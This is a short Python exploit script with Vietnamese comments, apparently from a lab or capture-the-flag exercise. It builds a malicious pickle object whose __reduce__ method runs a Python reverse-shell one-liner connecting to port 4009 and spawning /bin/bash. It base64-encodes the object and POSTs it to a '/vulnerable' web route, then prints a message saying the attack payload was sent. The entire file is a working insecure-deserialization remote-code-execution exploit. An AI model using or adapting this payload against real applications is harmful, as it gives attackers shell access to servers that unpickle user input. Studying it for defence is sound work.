import pickle
import base64
import os
import requests

class RcePayload(object):
    def __reduce__(self):
        cmd = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"127.0.0.1\", 4009));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        return (os.system, (cmd,))

# Serialize đối tượng độc hại
serialized_data = pickle.dumps(RcePayload())

# Mã hóa dạng URL-safe base64 theo đúng yêu cầu của web server
payload = base64.urlsafe_b64encode(serialized_data)

# Gửi HTTP POST request tới route /vulnerable của ứng dụng web
url = "http://127.0.0.1:5000/vulnerable"
data = {'hack': payload}
response = requests.post(url, data=data)

print("[+] Đã gửi payload tấn công thành công!")